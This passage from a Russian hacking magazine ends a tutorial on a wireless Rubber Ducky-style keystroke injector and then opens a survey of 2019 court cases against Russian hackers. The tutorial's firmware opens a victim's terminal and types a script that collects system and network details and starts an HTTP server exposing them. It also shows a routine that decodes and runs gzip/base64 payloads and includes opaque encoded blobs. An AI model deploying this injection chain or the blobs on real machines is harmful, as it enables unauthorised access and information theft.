не бывает. Осталось прикрепить крышку на мес то.





Что касается пульта, то при перехо де от макета к финальной версии я решил
оптимизировать питание. Дело в том, что для устойчивой работы переда‐
ющей части необходимо 3,3 В. Конечно, напряжение можно опустить до 3 В,
и тогда схему допустимо запитать и от двух батареек АА. Но так не удастся
выжать из батареек весь заряд, ведь их конечное напряжение составляет
что‐то около 1 В (или примерно 2 В для двух пос ледовательно под ключенных
источников). А это явно недостаточно.
   Если взять аккумуляторы Ni‐MH, то это будет уже 2,4 В в заряженном сос‐
тоянии, что тоже маловато. Решением проблемы ока залось применение step‐
up‐преобразователя на ME2108A. Обвеса требуется минимум, а эффектив‐
ность микросхемы достигает 85%. Это позволяет питать схему от двух и даже
одного аккумулятора.





Я собрал пульт, поправил нес колько оши бок (забыл подтягивающие резис‐
торы для PCF8574), и все заработало. Потом померил ток потребле ния
от одного аккумулятора — целых 250 мА! Подоб ное ни в какие ворота
не лезет, так что исправим это и озаботимся вопросом энергосбереже ния
в нашем устройстве.


Энергосбережение
Держать микроконтрол лер включенным все время нет никакой необходимос‐
ти, он нужен лишь в момент нажатия кнопки. Помнишь, выше я писал про сиг‐
нал прерывания от контроллера клавиатуры? Тут он очень кстати. Поэтому
будем ждать нажатия кнопки, будить нашу схему, посылать данные в эфир
и снова засыпать. Кроме того, перевод NRF24L01 в режим stand by вместо
постоянного  приема  поз волит  дополнительно  сократить  потребление.
Финальный штрих — погасить светодиод, он тоже потребля ет нес колько мил‐
лиампер.
   Главное здесь — не забыть, что при пробуждении микроконтроллера блок
RCC тактируется от внутреннего генера тора 8 МГц напрямую. Это сбивает
все тайминги интерфейсов, поэтому нужно предус мотреть функцию перенас‐
тройки тактирования.


void sleep() {
    NRF_CE_LO(); // Выключаем приемник в NRF24
    printf("Going to sleep\n\r");
    // Настраиваем режим сна STOP, выход по прерыванию EXIT
    SCB_SCR |= SCB_SCR_SLEEPDEEP;
    PWR_CR &= ~PWR_CR_PDDS;
    PWR_CR |= PWR_CR_LPDS;
    PWR_CR |= PWR_CR_CWUF;
    gpio_clear(GPIOB,GPIO12); // Экономим еще 0,3 мА
    sleep_mode = 1; // Запоминаем, что заснули
    __asm__("WFI");
}


void wake() {
    // После выхода из сна надо перенастроить тактирование!
    rcc_clock_setup_in_hsi_out_48mhz();
    gpio_set(GPIOB, GPIO12);
    NRF_CE_HI(); // Включаем приемник
    sleep_mode = 0;
}

Применение этих нехитрых трюков поз волило снизить потребле ние более
чем в 500 раз! Финальное значение уда лось измерить на уровне око‐
ло 0,5 мА, что можно считать очень хорошим результатом.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    УТИНЫЕ ИСТОРИИ
              ДЕЛАЕМ СВОЙ АНАЛОГ RUBBER DUCKY
                    С БЕСПРОВОДНОЙ СВЯЗЬЮ





СЦЕНАРИИ ИСПОЛЬЗОВАНИЯ
Теперь перейдем к вариантам применения нашего комплекта. Самое первое,
но не самое оче видное применение — это пульт управле ния. Как пользовате‐
лю Arch Linux, мне очень нра вится MPlayer, управление которым полностью
осуществляется горячими клавишами.


             INFO

                     Подробнее о том, чем хорош Arch Linux, читай
                        в статье «Богатый минимализм. 10 причин уста‐
                        новить Arch Linux».


Подружить его с новым устройством очень просто. Отправка с пульта строки
PK2 A B приводит к эмуляции нажатия клавиши с кодом A и модификатором
B. Этими двумя значени ями можно описать любую клавишу и практически
любое сочетание клавиш из числа используемых.
   Окей, а как насчет чего‐нибудь повеселее?


           WARNING

                     Все описанное ниже представлено исключитель‐
                      но  в  ознакомительных  целях  и  не  является
                       руководством к действию. Так же следует пом‐
                          нить, что совершение неп равомерных действий
                       влечет за собой правовые последствия.


На самом деле дальше все зависит от тво его воображения. С таким устрой‐
ством можно разыграть незадачливого пользователя, прожимая горячие кла‐
виши в самый неподходящий момент (например, комбинация Alt + F4 в Win‐
dows раздражает жертву особенно быс тро).


«Глючная» мышь
Наверняка ты сталкивался с неотзывчивыми, плохо работающими мышами.
Во время работы или игры за компь ютером это очень неприятная штука. Что‐
бы имитировать такую мышь, мы можем хаотично двигать курсор, написав
несложную функцию:


void mouse_move_rand(void) {
    int dx, dy;
    dx = (rand() % 255) ‐ 127;
    dy = (rand() % 255) ‐ 127;
    mouse_move2(dx, dy);
}

Качество генератора псевдослучайных чисел тут несущественно. Однако,
чтобы все было совсем кра сиво, мы можем инициализировать генератор слу‐
чайным числом из АЦП, об этом была целая статья.


static uint16_t get_random(void) {
    // Получение случайного числа из АЦП
    uint16_t temp;
    uint8_t channel = 16;
    uint16_t adc = 0;
    rcc_periph_clock_enable(RCC_GPIOA);
    rcc_periph_clock_enable(RCC_ADC1);
    rcc_set_adcpre(RCC_CFGR_ADCPRE_PCLK2_DIV2);
    adc_power_off(ADC1);
    /* We configure everything for one single conversion. */
    adc_disable_scan_mode(ADC1);
    adc_set_single_conversion_mode(ADC1);
    adc_disable_external_trigger_regular(ADC1);
    adc_set_right_aligned(ADC1);
    /* We want to read the temperature sensor, so we have to enable
it. */
    adc_enable_temperature_sensor();
    adc_set_sample_time_on_all_channels(ADC1, ADC_SMPR_SMP_28DOT5CYC)
;
    adc_power_on(ADC1);
    /* Wait for ADC starting up. */
    for (uint32_t i = 0; i < 800000; i++) __asm__("nop");
    //adc_reset_calibration(ADC1);
    //adc_calibrate(ADC1);
    adc_set_regular_sequence(ADC1, 1, &channel);
    for (uint8_t i = 0; i < 16; i++) {
        temp <<= 1;
        adc_start_conversion_direct(ADC1);
        /* Wait for end of conversion. */
        while (!(ADC_SR(ADC1) & ADC_SR_EOC));
        temp|=ADC_DR(ADC1) & 0b1; // Нас интересуют два младших бита
    }
    adc_power_off(ADC1);
    rcc_periph_clock_disable(RCC_ADC1);
    return temp;
}

Работает неплохо, для инициализации ГПСЧ как раз хватит. Давим на кнопку,
курсор уезжает в произвольном нап равлении, и, если пользователь в этот
момент делает что‐то ответственное мышью, он будет нес колько удивлен.


Баловство с текстом
Точно так же по нажатию клавиши в текстовом документе можно отрисовать
какой‐нибудь ASCII‐арт. Например, вот такую птичку (я называю ее «трясогуз‐
кой», не спрашивай почему).



  ____________    __      ____________
  \_____     /   /_ \     \     _____/
   \_____    \____/  \____/    _____/
    \_____                    _____/
       \___________  ___________/
                 /____\



Чтобы добавить ее в код, понадобится много кавычек, переносов строк
и экранирования символов. Расставлять все это вручную утомительно, поэто‐
му можно воспользоваться скриптом и переко дировать текстовую картинку
в массив. Следующий скрипт принимает два аргумента: имя файла с кар‐
тинкой и имя выходного мас сива.


#!/bin/zsh
if [ ‐z $2 ]; then NAME="ascii"; else NAME=$2; fi;
N_LINE=$(wc ‐l $1|awk '{ print $1 }')
echo "static const uint8_t ${NAME}[]=" > out
for i in { 1..$N_LINE}
do
    #echo $i
    STR=$(sed ‐n 's/\\/\\\\/g;s/"/\"/g;'"${i}p" $1)
    echo $STR
    echo "$STR'\\n'" >> out
done
echo ';' >> out


Выполняем команды
Теперь давай сделаем что‐нибудь посерьезнее. Чтобы добраться до воз‐
можности исполнять команды в Windows, нужно ввести Super + R, затем наб‐
рать cmd и Enter. Главное — угадать с задержками, потому что если вводить
команду, пока окно консоли не открыто, то она улетит в пус тоту. Впрочем,
найти подобную информацию для Windows в интернете не составит тру да.
   Что же касается Linux, то, как ты понимаешь, тут уже возможны варианты.
Конечно, почти всегда можно рассчитывать на Ctrl + F2, но тогда придется
наверняка авторизоваться в системе, а это уже само по себе задача. Поэто‐
му примем для простоты, что мы уже знаем хоткей для вызова эмулятора тер‐
минала. Например, Ctrl + Alt +  T. Тогда мы можем набрать какую‐нибудь
однострочную команду или вовсе написать неболь шой скрипт.


void write_script_and_run_it() {
    send_shortkey('t',MOD_CTRL|MOD_ALT); // Ctrl + Alt + t — open
console
    for(uint32_t i = 0; i < 0x2FFFFF; i++) __asm__("nop");
    send_word("echo '#!/bin/zsh' >> payload.sh\n"
        "echo Candidum is the best!>> payload.sh\n"
        "echo 'for i in {1..100}'>> payload.sh\n"
        "echo 'do echo TEST payload script $i'>> payload.sh\n"
        "echo 'done'>> payload.sh\n"
        "echo 'rm payload.sh'\n"
        "clear\n"
        "chmod +x payload.sh\n"
        "./payload.sh\n");
}

Однако и такой подход неудобен и нерациона лен, пос кольку требует много
лишних команд.


Бэкдор
Есть вариант гораздо эффективнее и изящ нее — связка потокового сжатия
и кодирования в Base64. Возьмем небольшой скрипт, который собирает
информацию о системе и открывает бэкдор.


#!/bin/bash
echo "*****************SYSTEM INFO*****************" > report.txt
echo "*****************RELEASE*****************" >> report.txt
cat /etc/*‐release* >> report.txt
echo "*****************UNAME*****************" >> report.txt
uname ‐a >> report.txt
echo "*****************USER*****************" >> report.txt
who >> report.txt
whoami >> report.txt
echo "*****************IP*****************" >> report.txt
ip addr show >> report.txt
#cat report.txt
python ‐m http.server 8080 &

Сжимаем  его  при  помощи   gzip  на   лету,  перекодируя  результат
в Base64 с помощью cat script.sh|gzip ‐9|base64. Пос ле небольшой
обработки получаем вот такой мас сив в прошивке микроконтрол лера.


static const uint8_t info_payload[] =


"H4sIAAAAAAACA42QvQ6CMBCAd57ihMSBBMrIZMJQExJBQ3VwLHBJSYQ2bRV9e3ET‐
f1Juu5/
vu8sF"


"K1J3A6m5ER42QoIffgY7syMtIC+3+6+eDxvQqKS2sb3bf4aK7mjG6C96hjf‐
cAkHbkDDSeEFuMJwm"
    "3P5TmRVOO3jXgfcIEV/
mZLRyHjxO6Ew2FXjfLVqQH5z6TgFvWw1GyHHuDF6vesvVwwo5QNSDsFbF"
    "BvUNNaRJmsDaewJip36j5AEAAA==";

Осталось только выпол нить обратную процеду ру, благо Base64 и gzip у нас
стандартные утилиты. Набира ем echo BASE64 |base64 ‐d|gzip ‐d>pay‐
load.sh;chmod +x payload.sh;./payload.sh\n или, если смотреть со сто‐
роны прошив ки:


void run_script_gzip(uint8_t *src) {
    send_shortkey('t',MOD_CTRL|MOD_ALT); // Ctrl + Alt + t — open
console
    for (uint32_t i = 0; i < 0x2FFFFF; i++) __asm__("nop");
    send_word("echo ");
    send_word(src);
    send_word("|base64 ‐d|gzip ‐d>payload.sh;"
        "chmod +x payload.sh;"
        "./payload.sh\n");
    for(uint32_t i = 0; i < 0x2FFFFF; i++) __asm__("nop");
    send_word("\n");
            cat_ascii_art_gzip(bird_base64);
}

А в конце добавляем нашу птицу, куда же без нее. Таким образом, кстати,
очень удобно хранить и выводить в терминале ASCII‐графику, тут и экономия
места, и ускорение набора налицо. Да и создавать такие массивы тоже про‐
ще скриптом.


#!/bin/zsh
if [ ‐z $2 ]; then NAME="ascii"; else NAME=$2; fi;
echo "static const uint8_t ${NAME}[]=" |tee "${NAME}.h"
cat $1|gzip ‐9|base64|sed ‐e 's/^/"/g;s/$/"/g'|tee ‐a "${NAME}.h"
echo ';' |tee ‐a "${NAME}.h"

Листинг еще короче предыдущего, а экономия места в разы. Как тебе уже
наверняка понятно, в качестве нагрузки скрипты использовать особенно
удобно. Причем это необязательно должен быть shell. Python выглядит даже
более привлекательно. Вот, нап ример, Reverse shell или кейс с шифроваль‐
щиком. Здесь определен но есть где развернуться и над чем поэксперимен‐
тировать на досуге. Думаю, теперь мне точно уда лось тебя заинтересовать
достаточно сильно, так что дальше ты и сам разберешься.


        WWW

                       Как   всегда,   исходники  проекта   доступны
                       на GitHub.



БОНУС
Ну а для тех, кто не поленился дочитать до самого конца, по традиции
небольшой бонус. Удачи! :)


H4sIAAAAAAACA41XXW/iOBR951d4kbYe1ak1D6hoiLpSM9VCMfF2s2wgPBA3DWFMDNsxaVV4mN++

tkPClxkNEsSOzz22z72+1wBg/eCrNBfM4e+rGY4bdsw6yPL5+wuS69Wy69EHbMU99zw6SFYcYS7f

loMu9ZdrK5AGj5JBlA4I9f9MGOT0b2kDsns68tumhYT/GasnnBJhg3I6GlzH7t0Mm26EYycGf1Eb

9DmgS/WIsXB0dzEFMQPed8eGndFBxxF39DPTvGLN6Oc/AE+IDTvuTd5+27XjTy9lI3/yrIsA8OuD

Fr/cZ/mqIG0yvuABmJW8V1v5EisrHDWAY4e+6/eseMZ3TQCcsNH+jsHt7xbgVJjHnV6HbGRw9R9P

MEBnXkj1K4zj57Z1vqKRo+DhFgxwKk/HvkFlf434U2IJvAw8p4+skS5Qdy5Bi/aPQNhJh+X8kPRf

zqxjLlErAToS2YuYAhyDIsfG7srtyKxZXLmVdptHkkgX17bpKwPi7ZucFLyUm/1Qg9N4CNhmncES

1ASrUuBy19cil46m4O0cx0vcJzxs1s7qq3l7II00V/PmZJ8xMw5uhsRpGbEBSRestiXm653s72Z9

hY8isa+8gDfr9nRvqfURgwX4+efTVwhwqzZ6MoqUCl/ICOqLFGu7snE0PCnR4gDH6qZT6EOn+lFl

0zKDvFRnD5zv5yzUINZ0eWUTmd+u/nlVsXtzujD1oslZ34xXNoNyKT/UclsYsBE7OTdsBMAXZPab

1GmLVjuIwO26XFG8Uxvvnu6wDJ95nW7ud0/NdR1lqAPrudj0uvOaLUKCyg0XSS13pPkWzdrTp1r3

2RiXZ1ts9md/uABh1cTnyU4AHBq34wU8SBgIVq2MnxkZJww02caekDYHMlfqmB1sVRKxxkn7MGIM

R6URshngsA4Xvt+oBfkR1c2sWzdzfg4thD2EiaVCkUsHpJ+cgZ3HS+Bt7ww8vHz2Hhu/vAodlqdo/

q9Nxl3YPZ3tsdLXFKu4rcoaiKfVYDA/gWPvMMf3qd9Lpvs36WmZld2jaImId3jUUngCF+vjIjJ0

D7vZCRr6I596KktzhPaZoA73s436IxqQgku97BGdmPOLUFGQgNLzO0fokVxuZ0imgUd9mkuEOFdg

4tHz4szCoCi4WoeUaUr1qnQnTSeTaHYeVJHBuho7UWxUd03HdkshetStiElFHEILloVW3sx2sES9

Bjra09qQUI+5/JgUWk+34XSPlmpPA1Br5R5RLuy3GE3CjxjFBSDqaJxHiWFUivGLjE5HMwLFmCBH

LcMKdNSlVG/bD1XsUC9RN1Q7UHDH/UgDX5+Nse/lWn/rbRerqbde4JOx6vT+8b1EKWm9Q3LBEV91

PaIL15gky4vekTuBAhXQTpfsXI4vuhzJbZ6qdu1yq0p1MCtWr7fzeWZ1+i7wP1JVSEiQlKxtK1Ly

jibVpQvSRNtJuzdhpEIeSc/UpmqlVu29QlOWxRCa2S84yURxb5d+SPKTQAqVnNmu3VRzyyd7eEwE

r4sZiy5ODCZusk/gRe5KcfHs7HFjHQA23Fopw4u6e59zGdm8PVNqF3ld6tws4yi1/LXKdFTMRLZP

OMlWcmlJWz0iiiylcF96PCIy76C2JXA+09d5qiJbeO3D3EtJImz/wlLPp1+O5VcZ1m83wC99IGv8

D3P9NCyjDgAA
ВЗЛОМ
 ТАКИЕ
  ДЕЛА

               КАК И ЗА ЧТО СУДИЛИ
            РОССИЙСКИХ ХАКЕРОВ
                В 2019 ГОДУ





                                                                           Виталий Евсиков
                                                                                          evsikovv@gmail.com





Новости о задер жаниях киберпреступников на территории
России появ ляются в СМИ с завидной регулярностью.
Заголовки гром кие, но из них нельзя понять, в чем конкретно
обвиняются задержанные и какие они совершили преступле‐
ния. Эта статья расскажет тебе о том, как в нашей стране
судят киберзлодеев и насколько строга к ним наша судебная
система.


Как известно, в России главными борцами с киберпреступностью выступают
специализированные подразделения ФСБ и МВД. По их материалам воз‐
буждают  уголовные  дела, которые впоследствии передают  в  суд,  где
выносится судебное решение. Чтобы оценить эффективность борьбы с прес‐
туплениями в сфере компь ютерных технологий, я проанализировал судебные
решения за 2019 год по хакерским статьям Уголовного кодекса на основе
открытых данных. Эти сведения размещаются в сети в соответствии с ФЗ
от 22.12.2008 № 262‐ФЗ «Об обеспечении дос тупа к информации о деятель‐
ности судов в Российской Федера ции». В некоторых случаях тексты судебных
актов отсутствовали (без объяснения при чин) — их я в иссле довании не рас‐
сматривал.


АТАКИ НА ГОСУДАРСТВЕННЫЕ ОБЪЕКТЫ ИНФОРМАЦИОННОЙ
ИНФРАСТРУКТУРЫ РФ
Новости об этих преступлениях ты мог видеть в СМИ под заголовком «Осуж‐
ден хакер, который пытался взло мать сайт Пра вительства, Администрации,
Министерства…». Громкий заголо вок, слова «хакер» и «взломал» создают
у рядового читателя впечатление, будто задержан матерый преступник.
Но так бывает далеко не всегда.
   Схема совершения преступления такова: злоумышленник устанавливает
на свой компьютер хакерский софт и ломает с его помощью удаленные сер‐
веры, среди которых обна руживается принадлежащий государс твенному
органу ресурс. В подобных делах отмечаются три типа компьютерных атак:
SQL injection, Bruteforce и DDoS. Сог ласно судеб ным решениям, при совер‐
шении компьютерных атак киберпрес тупники используют следующие прог‐
раммы, признанные вредонос ными: ScanSSH, Intercepter‐NG, NLBrute 1.2,
RDP Brute, Ultra RDP2, sqlmap, Netsparker, SQLi Dumper.
  При этом во многих текстах судебных решений ука зано, что компьютерные
атаки совершались с реальных IP‐адресов. То есть правоохранительные
органы легко вычисляют зло деев и доказывают их причастность к противоп‐
равной деятельности.





  Результаты рассмотрения уголовных дел об ата ках на государственные
  объекты информационной инфраструктуры РФ



 • Реальный срок — лишение свободы на определенный срок.
 • Другие виды наказания — все, что не влечет реального лишения свободы.
 • Уголовное дело прекращено — в связи с примирением сторон, наз‐
   начением судебного штрафа или деятельным рас каянием. Принципиаль‐
   ное отличие от других видов наказаний — лицо не считается судимым.



Такие компьютерные атаки редко при водят к реальному взлому системы,
и чаще всего их совершают «начинающие хакеры». Этим объясняются отно‐
сительно «мягкие» приговоры судов: из 27 случаев только в трех назначены
реальные сроки — в отношении рецидивис тов, ранее осужденных по раз‐
личным статьям Уголовного кодекса. В три надцати случаях подсудимые под‐
верглись иным видам наказания, не связанным с лишением свободы.
В десяти случаях уголовное дело прекращено.
   Весьма любопытен кейс, когда перед судом предстал уже отбывающий
наказание в исправительной колонии гражданин. Сотрудники исправитель‐
ного учрежде ния предос тавили ему дос туп к компь юте ру в отделе безопас‐
ности для оформления спра вочных и документальных материалов, а также
создания 3D‐модели колонии. Подсудимый обнаружил в сети картотеку зак‐
люченных и скопировал ее для дальнейшего изу чения. Затем с помощью
программы IPScan, полученной от инженера группы автоматизации, он нашел
в локальной сети proxy‐сервер. Подключившись  к нему, злодей скачал
из интернета вредоносное ПО Intercepter‐NG и NLBrute 1.2, с помощью
которых попытался взло мать еще один компьютер. Все это зву чит забавно,
но такой уровень информационной безопас ности в отде ле бе зопасности
исправительной колонии все‐таки удивляет.


ХИЩЕНИЕ ДЕНЕГ
В XXI веке деньги хранят не только в сберегатель ной кассе, но и на счетах
электронных платежных систем. Считается, что свя занные с хищением денег
киберпреступле ния несут высокую степень общес твенной опасности, из‐за
чего наказание по ним более строгое.





  Результаты рассмотрения уголовных дел о компь ютерных атаках, нап‐
  равленных на хищение денежных средств


Взлом банкоматов
В 2019 году было вынесено три судебных решения по этому виду преступле‐
ний. О первом из них ты наверняка слышал благодаря громким заголовкам
СМИ: «В России вынесли приговор хакерам из международной прес тупной
группировки Cobalt». Под таким наз ванием известный новос тной сайт опуб‐
ликовал статью об осуждении  двух  «мулов», при частных  к похище нию
в 2017 году 21,7 миллиона рублей у якутского банка «Алмазэргиэнбанк».
  Дело было так. Представители хакерской группировки Cobalt взломали
рабочий компьютер сотрудника банка с помощью рассылки фейковых писем
якобы от службы поддержки Microsoft. Закрепившись в сети, хакеры повысили
свои привилегии до уровня администра тора домена, подключились к бан‐
коматам по RDP и с помощью вредоносного ПО отправляли команды
на выдачу банкнот. Сбором денежных средств как раз и занимались пред‐
ставшие перед судом два брата. За работу они получили 10% от похищенной
суммы.
  Суд назначил им наказа ние в виде шес ти с полови ной и пяти с половиной
лет лишения свободы. Примечательно, что похищенные деньги они уже успе‐
ли передать организаторам, оставив себе два миллиона рублей. Эти деньги
они направили на погашение причиненного банку материального ущерба.
Оставшаяся часть иска также была погашена, в том чис ле за счет квартиры
одного из братьев.
  Во втором случае перед судом предста ла группа из четырех человек.
Преступники вскрывали банкоматы и подключались к USB‐портам, а потом
с помощью вредоно са Cutlet Maker запус кали выдачу банкнот. При этом уда‐
ленно активировал программу неустановленный участник группы, который
за свои «услуги» получал 30% от похищенной суммы.
  Преступники  совершили  несколько  попыток  взлома  банкоматов,
но успешной оказалась только одна. Похищена сумма от 250 тысяч до 1 мил‐
лиона рублей. Злодеи были задержаны при очередной попытке вскрытия бан‐
комата. Суд назначил им наказа ние от года и семи месяцев до четырех лет
лишения свободы.
   Третий случай аналогичен вто рому. Тот же Cutlet Maker, те же 30% за уда‐
ленную активацию. Прес тупник действовал в одиночку. Из банкомата ПАО
«МИнБанк» он выгрузил око ло четырех миллионов рублей и был пойман
при второй попытке взлома банкомата. Суд не принял доводы защиты о слож‐
ном финансовом положении подсудимого и назначил наказание в виде
четырех лет лишения свободы.
  Все эти случаи объеди няет одно: перед судом предстали низкоквалифи‐
цированные участники прес тупных групп, и к ним больше под ходит определе‐
ние «воры», чем «хакеры». «Моз говые центры» и настоящие организаторы
оказались вне досягаемости пра воохранителей.


Трояны для Android
В этом разделе особого внимания зас лужива ют два эпизода. В одном из них
к реальному сроку приговорен зло умышленник, который совершил прес‐
тупление, уже находясь в испра вительной колонии. При помощи смартфона
он скомпилировал и рас простра нил Android‐троян, который устанавливался
на мобильные устрой ства граж дан Рос сии. Пос ле чего злодей перевел день‐
ги с их банков ских карт через систему дистанционного банковского обслу‐
живания. Остается толь ко догадываться, каким образом он получил смар‐
тфон, уже отбывая наказа ние, а также как он приобрел необходимые навыки
и знания — ведь на момент совершения преступления он находился в местах
лишения свободы уже больше десяти лет.
  Эпизод с задержанием в Чувашской рес публике участника хакерской
группы TipTop также получил широкую огласку в российских СМИ. Несколько
лет  злоумышленники  распространяли банковские  трояны  Hqwar,  Honli,
Asacub.g, Cron и CatsElite под видом различных при ложений и устанавливали
их на Android‐смартфоны пользователей. С помощью вредоносного ПО они
перехватывали информа цию, похища ли данные банковских карт и воровали
деньги у граждан. И вновь перед судом предстал рядовой участник группы,
выпол нявший роль заливщика. По совокупности преступле ний ему назначено
наказание в виде двух лет лишения свободы условно.
  В остальных же случаях под кара ющую длань пра восу дия также попадали
исключительно низкоквалифицированные учас тни ки преступных групп —
заливщики и дроповоды, которые нашли предложение о  нелегальном
заработке на теневых форумах и откликнулись на него.


Фишинг
С помощью фишинговых сообщений некий киберзлодей завладел учетками
от почтовых ящиков автомагазинов. Пос ле это го он выставлял клиентам
магазинов счета с поддельными банковски ми реквизитами. На суде рассмат‐
ривалось 80 эпизодов, всего подсудимый похитил около 3,5 миллиона руб‐
лей. Примечательно, что фишинговые стра ницы, имитирующие окно авто‐
ризации в почтовых сервисах, эксперт признал вредоносным программным
обеспечением. Злоумышленнику  назначено  наказание  в  виде  четырех
с половиной лет лишения свободы.
  В другом случае хищения денег с помощью фишинга дело ограничилось
условным наказанием. Прес тупник под делывал страницы входа в банковское
приложение,  благодаря  чему  завладел  данными  авторизации  клиента
и перевел 14 800 рублей на находя щийся под его контролем лицевой счет.
  Наказание, не связанное с реальным лишением свободы, также получил
житель Воронежа. Он предлагал услуги взлома электронной почты и акка‐
унтов в социальных сетях за скромное вознаграждение в 2–5 тысяч рублей.
Данные учетных записей он похищал, рас сылая фишинговые сообщения
от имени администрации сервисов. Занимался он этим два года, пока не был
пойман сотрудниками пра воохранитель ных орга нов.


Вещевой кардинг
Подсудимый взламывал акка унты пользователей магази нов amazon.com,
pharmacy.kmart.com, pccomponentes.com и некоторых других и покупал
товары. Вещи он перепродавал на хакерских форумах wwh‐club.net и exploit.in
за 60–70 % от номинальной стоимости. Работал через виртуальный сервер,
приобретенный у зарегистрированного в России хостинг‐провайдера. Зло‐
дею было назначено наказание в виде ограничения свободы.


Ransomware
IT‐специалистам на практике час то приходится встречаться с последствиями
этого вида преступлений. Тем не менее судеб ных решений за 2019 год нас‐
читывается все го три.
  В первом случае зло умышленник брутфорсил серверы российских ком‐
паний и шифровал базы 1С на взломанных системах. За программу‐дешиф‐
ратор требовал перечис лить 3000 руб лей на номер мобильного телефона.
Назначено наказание в виде условного сро ка.
  Во втором случае рассматривалось дело о шифровании 1835 компьюте‐
ров (все зарубежные). Для взло ма и получения учеток использовались прог‐
раммы RDP Brute и mimicatz. С целью анонимизации злоумышленник арен‐
довал зарубежные серверы, вредоносное ПО хра нил в криптоконтейнерах.
Выходил в интернет с помощью USB‐модема «Мегафон», используя при этом
различные SIM‐карты (менял их несколько раз в месяц). Компьютеры, находя‐
щиеся в России, не взламывал из сво их «моральных убеждений». Получив
требуемую сумму в биткойнах, преступник отправлял ключи пострадавшим.
Всего, по данным суда, он зарабо тал 3 936 091 рубль.
  Несмотря на все предпринятые меры конспи рации, прес тупник был
задержан правоохранительными органами. Ему наз начено условное наказа‐
ние в виде семи месяцев лишения свободы с испы тательным сроком в один
год и штраф в 100 тысяч рублей. Гражданских исков по делу не заявлено.
  В итоге кибер преступник остался на свободе, от похищенных денежных
средств у него сохранилось почти четыре миллиона рублей, государство
получило в виде штрафа 100 тысяч. Окажись он в США, его наверняка жда‐
ло бы более суровое наказание, подкрепленное более значительным штра‐
фом. Плюс ко всему, отправившись за границу, он может рас счи тывать
на один из принципов международного права — Non bis in idem («Человек
не несет ответственность за одну провин ность больше одного раза»). Нас‐
тоящий happy end для хакера!
  Еще один случай шифрования файлов и требова ния выкупа при мечателен
тем, что преступники были осуждены по относительно новой статье Уголов‐
ного  кодекса  274.1 —  «Неправомерное  воздей ствие  на  критическую
информационную инфраструктуру РФ». Зашифрованными оказались сер‐
веры компании АО «Вос точная верфь», которые считаются объектом кри‐
тической информационной инфраструктуры. Не самая удачная цель для атаки
с точки зре ния потенциального наказа ния. Преступники получи ли по два года
лишения свободы условно.


Bughunter
Неудачный случай багхантинга произо шел в городе Балаково Саратовской
области. Местный хакер взламывал учетные записи интернет‐магазинов
и онлайн‐сервисов с помощью Private Keeper. Он угрожал распространить
полученные дан ные и требовал от владельцев сервисов денежное воз‐
награждение за информа цию о якобы имеющей ся уяз вимос ти. Требуемая
сумма доходила до 250 тысяч рублей. Деньги он просил переводить на QIWI‐
кошелек и банковскую карту, зарегистрированные на его мать. Среди постра‐
давших нашлись те, кто согласился выплатить требуемую сумму. Уве рен, ты
и сам догадался,  что после выплаты денежных средств потерпевшие
не получали никакого отчета о выявленных багах.
   Также злодей перевел себе бонусы со взло манных личных кабинетов
пользователей сайта оплаты коммунальных услуг на сумму 2100 рублей. Судя
по всему, он не придерживался высоких мораль ных принципов и готов был
красть отовсюду. Учитывая молодой возраст и сос тояние здоровья, злодею
назначили наказание в виде трех лет и трех месяцев лишения свободы
условно.
   Здесь в очередной раз мы видим пример, когда киберпреступни ком ста‐
новится пользователь, не обла дающий глубокими хакерски ми поз наниями,
но зато имеющий компьютер и выход в интернет.


УСЛУГИ
Распространение вредоносов
Ты наверняка видел на хакерских форумах и в Telegram‐каналах объявления
о продаже вредоносного софта. Опытные про давцы и разработчики мал вари
используют различные способы ано нимизации или работают через пос‐
редников,  что  позволя ет  им  избежать  уго ловной  ответственности.
Перед судом предстают, как пра вило, начина ющие хакеры. Ущерб от их дей‐
ствий незначительный, поэто му и наказа ние не строгое.





   Результаты рассмотрения уголовных дел о рас пространении мал вари

Среди рассмотренных  в прошлом  году судеб ных дел  в  пяти  случаях
с помощью мессенджера Telegram распростра нялись скрытые майнеры,
активатор ПО и программы для брутфорса. Еще в одном случае злоумыш‐
ленник создавал RAT и продавал с его помощью Skype за 1600 рублей.
Во всех случаях назначено наказание, не связанное с реальным лишением
свободы.
  А вот администратору Telegram‐канала «Dark Side / Мануалы / Схемы»
повезло не так сильно. На момент совершения прес тупления он имел
условное наказание по статье 159.1 УК РФ («Мошенничество в сфере кре‐
дитования») с не истекшим испытатель ным сроком. В своем канале админ
распространял программы AntiCaptcha Brute and Checker, BigStockPhotos,
eBay Checker и PayPal Brute & Checker, за что и был задержан сотрудниками
полиции. С уче том неот бытой части наказа ния ему наз начили три года
лишения свободы.


Стилеры
Злоумышленник    с   помощью    стилера    незаконно    скопировал
не менее 42 371 архива с паролями, данными кредитных карт, аккаунтов
Steam. Он планировал продать информацию не менее чем за 4 563 000 руб‐
лей, но не успел. Суд наз начил ему условное наказание в виде двух лет
лишения свободы.
  Во втором случае житель Челябинска раз мещал на YouTube видео о про‐
хождении компьютер ных игр и размещал тут же под видом патча ссылку
на скачивание стилера. Прес тупник похитил учет ные данные от интернет‐сер‐
висов нескольких поль зователей. Он получил наказа ние в виде ограничения
свободы.


Веб-шеллы
Один из осужденных продавал веб‐шеллы и софт для брутфорса. Пойман
на продаже вредоноса сотруднику ФСБ, выполнявшему проверочную закупку.
Незадачливому тор говцу назначено наказание в виде ограниче ния свободы.


Продажа учетных данных
Преступники брутфорсили акка унты от популярных интернет‐сервисов и про‐
веряли их валидность, а потом продавали. В двух случаях назначено наказа‐
ние в виде ограничения свободы, в одном случае уголовное дело прек‐
ращено и назначен штраф 10 тысяч рублей.


НАРУШЕНИЕ АВТОРСКИХ ПРАВ
Это наиболее популярная статья, по которой правоохранительные органы
привлекают к ответственности айтишников. Виновность обвиняемого легко
доказуема, в большинстве эпизодов сбор доказа тель ств ограничивался про‐
верочной закупкой.





   Результаты рассмотрения уголовных дел о нарушении авторских прав


Нейтрализация средств защиты лицензионного ПО
Схема сбора доказательной базы такова: проводится проверочная закупка —
у злоумышленника заказывают уста новку дорогос тоящего ПО. Чаще все го
«закупали» «Компас‐3D», ArchiCAD, Autodesk AutoCAD, Microsoft Oﬃce, Mi‐
crosoft Windows, «ПрофСтрой». За установку нелицензионного ПО злоумыш‐
ленники получали вознаграждение от 700 до 5000 руб лей.
  Радует то, что в половине случаев подсудимые освобождались от уголов‐
ного наказания, которое заменя лось судеб ным штра фом. Но применить эту
процессуальную нор му не всегда можно — в некоторых слу чаях опе ративники
